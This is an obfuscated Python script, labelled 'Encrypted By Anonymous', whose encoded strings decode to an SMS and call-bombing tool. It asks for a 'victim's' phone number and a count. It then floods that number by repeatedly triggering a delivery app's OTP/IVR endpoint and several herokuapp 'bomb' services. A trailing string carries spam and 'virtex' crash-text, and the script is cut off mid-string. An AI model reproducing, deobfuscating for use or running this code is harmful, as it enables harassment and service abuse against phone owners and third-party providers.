# Python code Encrypted By Anonymous
 

import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKdHJ5OgoJaW1wb3J0IGNvbG9yYW1hCmV4Y2VwdCBNb2R1bGVOb3RGb3VuZEVycm9yOgoJcHJpbnQoImNvbG9yYW1hIGlzIG5vdCBJbnN0YWxsZWQiKQoJb3Muc3lzdGVtKCJwaXAgaW5zdGFsbCBjb2xvcmFtYSIpCnRyeToKCWltcG9ydCByZXF1ZXN0cwpleGNlcHQgTW9kdWxlTm90Rm91bmRFcnJvcjoKCXByaW50KCJSZXF1ZXN0cyBpcyBub3QgSW5zdGFsbGVkIikKCW9zLnN5c3RlbSgicGlwIGluc3RhbGwgcmVxdWVzdHMiKQpkZWYgY2hlY2tfaW50cigpOgogICAgdHJ5OgogICAgICAgIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9tb3RoZXJmdWNraW5nd2Vic2l0ZS5jb20iKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwcmludCgiQWJlIENodXRpeWEgSW50ZXJuZXQgT24gS2FyLiBJbnRlcm5ldCBFcnJvciIpCiAgICAgICAgc3lzLmV4aXQoMikKZnJvbSBjb2xvcmFtYSBpbXBvcnQgIEZvcmUsU3R5bGUKUiA9IEZvcmUuUkVECkIgPSBGb3JlLkJMVUUKRyA9IEZvcmUuR1JFRU4KQyA9IEZvcmUuQ1lBTgpZICA9IEZvcmUuWUVMTE9XCk0gPSBGb3JlLk1BR0VOVEEKVyA9IEZvcmUuV0hJVEUKUkVEPSIkKHByaW50ZiAnXGVbMzFtJykiCkdSRUVOPSIkKHByaW50ZiAnXGVbMzJtJykiCk9SQU5HRT0iJChwcmludGYgJ1xlWzMzbScpIgpCTFVFPSIkKHByaW50ZiAnXGVbMzRtJykiCk1BR0VOVEE9IiQocHJpbnRmICdcZVszNW0nKSIKQ1lBTj0iJChwcmludGYgJ1xlWzM2bScpIgpXSElURT0iJChwcmludGYgJ1xlWzM3bScpIgpCTEFDSz0iJChwcmludGYgJ1xlWzMwbScpIgpsaWMgPSAiIiIKIyAgQ29weXJpZ2h0IDIwMjEgVER5bmFtb3MgPHRkeW5hbW9zQGxpbnV4PgojICAKIyAgVGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU7IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkKIyAgaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhcyBwdWJsaXNoZWQgYnkKIyAgdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbjsgZWl0aGVyIHZlcnNpb24gMiBvZiB0aGUgTGljZW5zZSwgb3IKIyAgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4KIyAgCiMgIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLAojICBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZgojICBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlCiMgIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuCiMgIAojICBZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZQojICBhbG9uZyB3aXRoIHRoaXMgcHJvZ3JhbTsgaWYgbm90LCB3cml0ZSB0byB0aGUgRnJlZSBTb2Z0d2FyZQojICBGb3VuZGF0aW9uLCBJbmMuLCA1MSBGcmFua2xpbiBTdHJlZXQsIEZpZnRoIEZsb29yLCBCb3N0b24sawojICBNQSAwMjExMC0xMzAxLCBVU0EuCiMgaWYgWW91IEhhdmUgQW55IFByb2JsZW0gQ29udGFjdCBNZSBPbiBJbnN0YSBAa3Jpc2hfbmFfMjU2OAojIEdoYXppcHVyIFVwIEluZGlhIAojIE15IEluc3RhIEBLcmlzaF9uYV8yNTY4CiIiIgoKbG9nbyA9IGYiIiIKe1J94pWt4pSB4pSB4pWu4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWt4pSB4pSB4pSB4pWuIOKVreKUgeKUgeKUgeKVruKVreKVruKVseKVreKVruKVseKVseKVseKVseKVseKVseKVreKVrgp7Un3ilIPila3ila7ilIPilbHilbHilbHilbHilbHilbHilbHilbHilbHilIPila3ilIHila7ilIMg4pSD4pWt4pSB4pWu4pSj4pWv4pWw4pSz4pWv4pWw4pWu4pWx4pWx4pWx4pWx4pWx4pSD4pSDCntXfeKUg+KVsOKVr+KVsOKUs+KUgeKUgeKUs+KUgeKUgeKUs+KUgeKUgeKUq+KUg+KVseKVsOKVryDilIPilIPilbHilIPilKPila7ila3ilLvila7ila3ilYvilIHilIHilLPilIHilIHilKvilIPila3ila4Ke1d94pSD4pWt4pSB4pWu4pSD4pWt4pWu4pSD4pWt4pWu4pSD4pWt4pWu4pSD4pSD4pWt4pSB4pWuIOKUg+KVsOKUgeKVr+KUg+KUg+KUg+KVseKUg+KUg+KUg+KVreKVruKUg+KVreKUgeKUq+KVsOKVr+KVrwp7R33ilIPilbDilIHila/ilIPila3ila7ilIPila3ila7ilIPilbDila/ilIPilbDilLvilIHilIMg4pSD4pWt4pSB4pWu4pSD4pSD4pWw4pWu4pSD4pWw4pSr4pWt4pWu4pSD4pWw4pSB4pSr4pWt4pWu4pWuCntHfeKVsOKUgeKUgeKUgeKUu+KVr+KVsOKUu+KVr+KVsOKUq+KVreKUgeKUu+KUgeKUgeKUgeKVryDilbDila/ilbHilbDila/ilbDilIHila/ilbDilIHilLvila/ilbDilLvilIHilIHilLvila/ilbDila8K4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pSD4pSDIHtDfUF1dGhvciA6IHtZfUJhYXBHIEtyaXNobmEge1l9UmFqcHV0CuKVseKVseKVseKVseKVseKVseKVseKVseKVseKVseKVsOKVryB7Q31Db2RlciAgOiB7WX1BbnNoIERhZHdhbCtISVJVCiAiIiIKZGVmIHNlbmQobnVtYmVyLCB0aW1lcyk6CglpbXBvcnQgcmVxdWVzdHMKCXVybCA9ICJodHRwczovL2FwaS56ZXB0by5jby5pbi9hcGkvdjEvdXNlci9jdXN0b21lci9zZW5kLW90cC1pdnIvIgoKCWhlYWQgPSB7J0hvc3QnOiAnYXBpLnplcHRvLmNvLmluJywgJ2FjY2VwdCc6ICdhcHBsaWNhdGlvbi9qc29uJywgJ2FjY2Vzcy1jb250cm9sLWFsbG93LWNyZWRlbnRpYWxzJzogJ3RydWUnLCAneC1yZXF1ZXN0ZWQtd2l0aCc6ICdYTUxIdHRwUmVxdWVzdCcsICdyZXF1ZXN0aWQnOiAnMDA2YjlhZWQtMjNjNi00NjQwLWJiNTctNjYwNzBiMjU4Mjg2JywgJ3Nlc3Npb25pZCc6ICd1bmRlZmluZWQnLCAnYXBwdmVyc2lvbic6ICc1LjEyLjEnLCAncGxhdGZvcm0nOiAnYW5kcm9pZCcsICdzeXN0ZW12ZXJzaW9uJzogJzEwJywgJ3NvdXJjZSc6ICdQTEFZX1NUT1JFJywgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywgJ2NvbnRlbnQtbGVuZ3RoJzogJzI5JywgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwJywgJ3VzZXItYWdlbnQnOiAnb2todHRwLzMuMTIuMTInfQoKCWRhdGEgPSd7Im1vYmlsZU51bWJlciI6JytmJyJ7bnVtYmVyfSInKyd9JwoKCWltcG9ydCB0aW1lCglmb3IgaWkgaW4gcmFuZ2UgKDEsIHRpbWVzKToKCQlyZXNwPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkLCBkYXRhPWRhdGEpCgkJdGltZS5zbGVlcCgzKQoKCQlwcmludChzdHIoaWkpKyIgIityZXNwLnRleHQpCgpvcy5zeXN0ZW0oJ2NsZWFyJykKZGVmIHNtcygpOgoJY2hlY2tfaW50cigpCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50KFN0eWxlLkJSSUdIVCtsb2dvKQoJcHJpbnQoRykKCW51bWJlcj1pbnB1dChmIntHfVt7V30re0d9XSBFbnRlciB0aGUgVmljdGltJ3MgUGhvbmUgbnVtYmVyIFxuXG57V30tLS0tLXtSfSMge0N9IikKCXByaW50KCkKCWNyYXNoPWludChpbnB1dChmJ3tHfVt7V30re0d9XSBIb3cgTWFueSB0aW1lcyBkbyB5b3Ugd2FudCB0byBTZW5kIFt7V30xe0d9XSBCZXR0ZXJcblxue1J9Pj4+e0d9ICcpKQoJbGluazMgPSBmImh0dHBzOi8vY2FsbGJvbWJlcnBybzIuaGVyb2t1YXBwLmNvbS9taXgve251bWJlcn0iCglsaW5rMiA9IGYiaHR0cHM6Ly9uZXd4eGxyODEuaGVyb2t1YXBwLmNvbS9ib21iL3tudW1iZXJ9IgoJbGluazMgPSBmImh0dHBzOi8vYmFhcGctYXR0YWNrb2xkMi5oZXJva3VhcHAuY29tL2JvbWIve251bWJlcn0iCglsaW5rNCA9IGYiaHR0cHM6Ly9uZXd4eGxyODIuaGVyb2t1YXBwLmNvbS9ib21iL3tudW1iZXJ9IgoJbGluazUgPSBmImh0dHBzOi8vYmFhcGctY2FsbDEuaGVyb2t1YXBwLmNvbS9ib21iL3tudW1iZXJ9IgoJbGluazYgPSBmImh0dHBzOi8vYmFhcGctYXR0YWNrb2xkMi5oZXJva3VhcHAuY29tL2JvbWIve251bWJlcn0iCglsaW5rNyA9IGYiaHR0cHM6Ly9iYWFwZy1jYWxsMi5oZXJva3VhcHAuY29tL2JvbWIve251bWJlcn0iCgl'
love = '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yBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZwNyEGVyBQNyBRRyZRRyEwNyBHLyBGtyBQuTo2kfo3pyZwOAMFHlZR9hWGVjFJ5mqTRyZwNyAQOepzymnS9hLI8lAGL4WHLjWGyTWHR0WHRmWGOOWHLjWGyTWGx0WHR1FRSMWGVjESIRDFHlZR5WF0SVWGVjJIIYWGVjDIqCF1qCFlHlZPITZPH5EvH5BPH4BPHjDFcbqUEjplHmDFHlEvHlEayiqKE1YzWyWGWTASZgnGN3BP1MJHHdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZP'
god = 'o5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEElMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEElMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqVklSVEVYJTIwQlVBVEFOJTIwTVIlMjBWSVJVUyUyMEJVS0FOJTIwS0FMRU5HJUMyJUIyKiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEElMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEElMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEElMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEElMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEElMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEElMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEElMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEElMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSVGMCU5RiU5MyU4Q0JZJUUyJTgwJUEyTVIlRTIlODAlQTJWVVJVUy1TUE0lRjAlOUYlOTIlQTMlMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OS